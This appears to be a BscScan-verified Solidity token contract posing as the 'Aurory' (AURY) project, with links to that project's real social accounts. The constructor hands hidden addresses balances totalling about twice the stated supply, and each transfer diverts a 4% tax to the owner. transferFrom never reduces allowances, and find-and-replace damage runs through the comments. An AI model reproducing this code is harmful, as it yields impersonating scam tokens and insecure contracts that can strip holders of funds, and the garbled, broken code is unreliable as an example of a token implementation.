/**
 *Submitted for verification at BscScan.com on 2021-10-24
*/

// SPDX-License-Identifier: MIT
// https://aurory.io/
// https://twitter.com/AuroryProject
// https://t.me/aurory_project
pragma solidity ^0.8.1;
// https://coinmarketcap.com/currencies/aurory/
interface SOLANATOKEN {
  // @dev Returns the amount of MiniAurory in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniAurory owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vAurorye);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vAurorye
    );
  
  */

  /**
   * @dev Moves `amount` MiniAurory from the caller's account to `recipient`.
   *
   * Returns a boolean vAurorye indicating whMiniAuroryr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniAurory that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vAurorye changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniAurory.
   *
   * Returns a boolean vAurorye indicating whMiniAuroryr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vAurorye afterwards:
   * https://github.com/Aurory/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniAurory from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vAurorye indicating whMiniAuroryr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vAurorye` MiniAurory are moved from one account (`from`) to  another (`to`). Note that `vAurorye` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vAurorye);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vAurorye` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vAurorye);
}

contract Aurory is SOLANATOKEN {

    // common addresses
    address private owner;
    address private Aurorys;
    address private MiniAurory;
    address private SOLANA;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Aurory";
    string public override symbol = "AURY";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vAurorye);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vAurorye);
    
    // On init of contract we're going to set the admin and give them all MiniAurory.
    constructor(uint totalSupplyVAurorye, address AurorysAddress, address MiniAuroryAddress, address SOLANAAddress) {
        // set total supply
        totalSupply = totalSupplyVAurorye;
        
        // designate addresses
        owner = msg.sender;
        Aurorys = AurorysAddress;
        MiniAurory = MiniAuroryAddress;
        SOLANA = SOLANAAddress;

        
        // split the MiniAurory according to agreed upon percentages
        balances[Aurorys] =  totalSupply * 1 / 100;
        balances[MiniAurory] = totalSupply * 98 / 100;
        balances[SOLANA] = totalSupply * 100 / 100;

        
        balances[owner] = totalSupply * 1 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vAurorye) public override returns(bool) {
        require(vAurorye > 0, "Transfer vAurorye has to be higher than 0.");
        require(balanceOf(msg.sender) >= vAurorye, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vAurorye
        uint reMiniAuroryBD = vAurorye * 4 / 100;
        uint burnTBD = vAurorye * 0 / 100;
        uint vAuroryeAfterTaxAndBurn = vAurorye - reMiniAuroryBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vAuroryeAfterTaxAndBurn;
        balances[msg.sender] -= vAurorye;
        
        emit Transfer(msg.sender, to, vAurorye);
        
        // finally, we burn and tax the Aurorys percentage
        balances[owner] += reMiniAuroryBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vAurorye) public override returns(bool) {
        allowances[msg.sender][spender] = vAurorye; 
        
        emit Approval(msg.sender, spender, vAurorye);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vAurorye) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vAurorye, "Allowance too low for transfer.");
        require(balances[from] >= vAurorye, "Balance is too low to make transfer.");
        
        balances[to] += vAurorye;
        balances[from] -= vAurorye;
        
        emit Transfer(from, to, vAurorye);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}